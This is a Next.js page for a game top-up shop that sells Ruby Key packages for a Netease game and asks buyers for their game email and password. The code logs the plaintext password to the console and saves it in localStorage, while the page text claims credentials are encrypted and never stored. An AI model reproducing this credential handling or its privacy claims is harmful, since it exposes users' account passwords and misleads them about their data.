"use client"

import { useState, useEffect, useRef } from "react"
import { useRouter } from "next/navigation"
import { motion } from "framer-motion"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Badge } from "@/components/ui/badge"
import { ShoppingCart, Key, Shield, ArrowLeft, Volume2, VolumeX, Eye, EyeOff } from "lucide-react"
import { toast } from "@/components/ui/use-toast"
import { Toaster } from "@/components/ui/toaster"

const rubyKeyProducts = {
  "10x Ruby Keys": { price: 1490, cost: 615.6 },
  "20x Ruby Keys": { price: 2890, cost: 1233.1 },
  "28x Ruby Keys": { price: 4180, cost: 1803.1 },
  "40x Ruby Keys": { price: 6889, cost: 2468.1 },
  "58x Ruby Keys": { price: 8700, cost: 3703.1 },
  "85x Ruby Keys": { price: 11800, cost: 5983.1 },
}

export default function InGamePackagesPage() {
  const router = useRouter()
  const [email, setEmail] = useState("")
  const [password, setPassword] = useState("")
  const [showPassword, setShowPassword] = useState(false)
  const [selectedProduct, setSelectedProduct] = useState<string | null>(null)
  const [isMusicPlaying, setIsMusicPlaying] = useState(false)
  const [isMusicLoaded, setIsMusicLoaded] = useState(false)
  const audioRef = useRef<HTMLAudioElement>(null)

  useEffect(() => {
    // Initialize audio
    if (audioRef.current) {
      audioRef.current.volume = 0.3
      audioRef.current.loop = true

      const handleCanPlay = () => {
        setIsMusicLoaded(true)
      }

      audioRef.current.addEventListener("canplaythrough", handleCanPlay)

      return () => {
        if (audioRef.current) {
          audioRef.current.removeEventListener("canplaythrough", handleCanPlay)
        }
      }
    }
  }, [])

  const toggleMusic = async () => {
    if (!audioRef.current || !isMusicLoaded) return

    try {
      if (isMusicPlaying) {
        audioRef.current.pause()
        setIsMusicPlaying(false)
      } else {
        await audioRef.current.play()
        setIsMusicPlaying(true)
      }
    } catch (error) {
      console.error("Error playing audio:", error)
      toast({
        title: "Audio Error",
        description: "Unable to play background music. Please check your browser settings.",
        variant: "destructive",
      })
    }
  }

  const handleProductSelect = (productName: string) => {
    if (!email.trim()) {
      toast({
        title: "Email Required",
        description: "Please enter your Netease game email first",
        variant: "destructive",
      })
      return
    }
    if (!password.trim()) {
      toast({
        title: "Password Required",
        description: "Please enter your Netease game password first",
        variant: "destructive",
      })
      return
    }
    setSelectedProduct(productName)
  }

  const handleProceedToPayment = () => {
    if (!selectedProduct || !email.trim() || !password.trim()) return

    const product = rubyKeyProducts[selectedProduct as keyof typeof rubyKeyProducts]

    // Store order data in localStorage for clean URL
    const orderData = {
      product: selectedProduct,
      email: email.trim(),
      password: password.trim(),
      price: product.price,
      cost: product.cost,
      timestamp: Date.now(),
      orderType: "in-game",
    }

    console.log("Saving order data to localStorage:", orderData)
    localStorage.setItem("pendingOrder", JSON.stringify(orderData))

    toast({
      title: "Redirecting to Payment",
      description: "Please complete your payment to process the order.",
    })

    // Navigate with clean URL
    setTimeout(() => {
      router.push("/payment/bkash")
    }, 1000)
  }

  return (
    <div className="min-h-screen relative overflow-hidden bg-black">
      <Toaster />

      {/* Background Music */}
      <audio ref={audioRef} preload="auto" src="https://www.soundjay.com/misc/sounds/bell-ringing-05.wav" />

      {/* Music Control */}
      <motion.div
        initial={{ opacity: 0, scale: 0.8 }}
        animate={{ opacity: 1, scale: 1 }}
        transition={{ delay: 1 }}
        className="fixed top-6 right-6 z-50"
      >
        <Button
          onClick={toggleMusic}
          disabled={!isMusicLoaded}
          className="w-12 h-12 rounded-full bg-white/10 hover:bg-white/20 backdrop-blur-xl border border-white/20 text-white shadow-lg transition-all duration-300"
        >
          {isMusicPlaying ? <Volume2 className="h-5 w-5" /> : <VolumeX className="h-5 w-5" />}
        </Button>
      </motion.div>

      {/* Clean Animated Background */}
      <div className="absolute inset-0 bg-gradient-to-br from-gray-900 via-black to-gray-900">
        <div className="absolute top-0 left-0 w-full h-full">
          {Array.from({ length: 30 }, (_, i) => (
            <motion.div
              key={i}
              className="absolute w-1 h-1 bg-white/20 rounded-full"
              initial={{ opacity: 0 }}
              animate={{
                opacity: [0, 1, 0],
                scale: [1, 1.5, 1],
              }}
              transition={{
                duration: 3,
                repeat: Number.POSITIVE_INFINITY,
                delay: Math.random() * 3,
              }}
              style={{
                left: `${Math.random() * 100}%`,
                top: `${Math.random() * 100}%`,
              }}
            />
          ))}
        </div>
      </div>

      {/* Header */}
      <header className="relative z-10 bg-black/40 backdrop-blur-xl border-b border-white/10">
        <div className="container mx-auto px-4 sm:px-6 py-6">
          <div className="flex items-center gap-4">
            <Button
              variant="ghost"
              onClick={() => router.back()}
              className="text-white hover:bg-white/10 rounded-xl bg-white/5 backdrop-blur-xl border border-white/20"
            >
              <ArrowLeft className="h-5 w-5 mr-2" />
              Back
            </Button>
            <h1 className="text-3xl font-bold text-white">In-Game Packages</h1>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="relative z-10 container mx-auto px-4 sm:px-6 py-12">
        <div className="max-w-7xl mx-auto space-y-16">
          {/* Header Section */}
          <motion.div
            initial={{ opacity: 0, y: 30 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.8 }}
            className="text-center space-y-8"
          >
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.8, delay: 0.8 }}
              className="max-w-2xl mx-auto"
            >
              <div className="space-y-6">
                <div className="bg-white/5 backdrop-blur-xl border border-white/10 rounded-2xl p-6">
                  <div className="flex items-center gap-3 mb-4">
                    <Shield className="h-6 w-6 text-blue-400" />
                    <h3 className="text-white text-lg font-semibold">Secure Account Access</h3>
                  </div>
                  <p className="text-gray-300 text-sm mb-6">
                    We'll securely log into your Netease account to deliver Ruby Keys directly. Your credentials are
                    encrypted and never stored.
                  </p>

                  <div className="space-y-4">
                    <div>
                      <Label htmlFor="email" className="text-white text-lg font-semibold">
                        Netease Game Email
                      </Label>
                      <Input
                        id="email"
                        type="email"
                        placeholder="Enter your Netease game email"
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                        className="h-14 text-lg bg-white/5 backdrop-blur-xl border border-white/20 text-white placeholder:text-gray-400 rounded-xl focus:border-white/40 focus:bg-white/10 transition-all duration-300"
                      />
                    </div>

                    <div>
                      <Label htmlFor="password" className="text-white text-lg font-semibold">
                        Netease Game Password
                      </Label>
                      <div className="relative">
                        <Input
                          id="password"
                          type={showPassword ? "text" : "password"}
                          placeholder="Enter your Netease game password"
                          value={password}
                          onChange={(e) => setPassword(e.target.value)}
                          className="h-14 text-lg bg-white/5 backdrop-blur-xl border border-white/20 text-white placeholder:text-gray-400 rounded-xl focus:border-white/40 focus:bg-white/10 transition-all duration-300 pr-12"
                        />
                        <Button
                          type="button"
                          variant="ghost"
                          size="sm"
                          className="absolute right-2 top-1/2 -translate-y-1/2 h-8 w-8 text-gray-400 hover:text-white"
                          onClick={() => setShowPassword(!showPassword)}
                        >
                          {showPassword ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                        </Button>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </motion.div>
          </motion.div>

          {/* Ruby Key Packages */}
          <motion.div
            initial={{ opacity: 0, y: 30 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.8, delay: 1 }}
            className="space-y-10"
          >
            <div className="text-center space-y-6">
              <h2 className="text-4xl sm:text-5xl font-bold text-white">Ruby Key Packages</h2>
              <p className="text-gray-300 text-xl sm:text-2xl">Exclusive in-game items delivered directly</p>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6">
              {Object.entries(rubyKeyProducts).map(([productName, product], index) => {
                const isSelected = selectedProduct === productName
                const isPopular = ["40x Ruby Keys", "58x Ruby Keys"].includes(productName)

                return (
                  <motion.div
                    key={productName}
                    initial={{ opacity: 0, y: 20 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ duration: 0.6, delay: index * 0.1 }}
                    whileHover={{ scale: 1.05, y: -5 }}
                    whileTap={{ scale: 0.95 }}
                  >
                    <Card
                      className={`relative overflow-hidden cursor-pointer transition-all duration-500 group ${
                        isSelected
                          ? "bg-white/15 backdrop-blur-2xl border-white/30 shadow-lg shadow-white/10"
                          : "bg-white/5 backdrop-blur-xl border-white/10 hover:bg-white/10 hover:border-white/20"
                      }`}
                      onClick={() => handleProductSelect(productName)}
                    >
                      {isPopular && (
                        <div className="absolute top-4 right-4 z-10">
                          <Badge className="bg-gradient-to-r from-purple-500 to-purple-600 text-white border-0 px-3 py-1 text-sm font-bold shadow-lg">
                            <Key className="h-3 w-3 mr-1" />
                            Popular
                          </Badge>
                        </div>
                      )}

                      <CardHeader className="pb-4">
                        <div className="w-12 h-12 bg-gradient-to-r from-red-500 to-red-600 rounded-xl flex items-center justify-center mx-auto mb-4 shadow-lg shadow-red-500/50">
                          <Key className="h-6 w-6 text-white" />
                        </div>
                        <CardTitle className="text-white text-xl font-bold text-center">{productName}</CardTitle>
                      </CardHeader>

                      <CardContent className="space-y-6">
                        <div className="text-center">
                          <div className="text-3xl font-bold text-white mb-2">৳{product.price.toLocaleString()}</div>
                          <p className="text-gray-400 text-sm">Delivered In-Game</p>
                        </div>

                        <div className="space-y-3">
                          <div className="flex items-center justify-between text-sm">
                            <span className="text-gray-300">Direct Delivery</span>
                            <Shield className="h-4 w-4 text-green-400" />
                          </div>
                          <div className="flex items-center justify-between text-sm">
                            <span className="text-gray-300">Secure Process</span>
                            <Shield className="h-4 w-4 text-green-400" />
                          </div>
                        </div>

                        {isSelected && (
                          <motion.div
                            initial={{ opacity: 0, height: 0 }}
                            animate={{ opacity: 1, height: "auto" }}
                            transition={{ duration: 0.3 }}
                            className="pt-4 border-t border-white/10"
                          >
                            <Button
                              onClick={(e) => {
                                e.stopPropagation()
                                handleProceedToPayment()
                              }}
                              className="w-full bg-gradient-to-r from-purple-500 to-purple-600 hover:from-purple-600 hover:to-purple-700 text-white font-semibold py-3 text-lg rounded-xl shadow-lg transition-all duration-300"
                            >
                              <ShoppingCart className="h-5 w-5 mr-2" />
                              Proceed to Payment
                            </Button>
                          </motion.div>
                        )}
                      </CardContent>
                    </Card>
                  </motion.div>
                )
              })}
            </div>
          </motion.div>

          {/* Security Notice */}
          <motion.div
            initial={{ opacity: 0, y: 30 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.8, delay: 1.4 }}
            className="text-center space-y-8"
          >
            <div className="bg-white/5 backdrop-blur-xl border border-white/10 rounded-2xl p-8 max-w-4xl mx-auto">
              <h3 className="text-2xl font-bold text-white mb-6">Security & Privacy</h3>
              <div className="grid grid-cols-1 md:grid-cols-3 gap-6 text-left">
                <div className="space-y-3">
                  <Shield className="h-8 w-8 text-blue-400" />
                  <h4 className="text-white font-semibold">Encrypted Connection</h4>
                  <p className="text-gray-300 text-sm">All data is transmitted using secure encryption protocols.</p>
                </div>
                <div className="space-y-3">
                  <Key className="h-8 w-8 text-purple-400" />
                  <h4 className="text-white font-semibold">No Data Storage</h4>
                  <p className="text-gray-300 text-sm">Your credentials are never stored on our servers.</p>
                </div>
                <div className="space-y-3">
                  <ShoppingCart className="h-8 w-8 text-green-400" />
                  <h4 className="text-white font-semibold">Instant Delivery</h4>
                  <p className="text-gray-300 text-sm">Items are delivered immediately after payment confirmation.</p>
                </div>
              </div>
            </div>
          </motion.div>
        </div>
      </main>
    </div>
  )
}
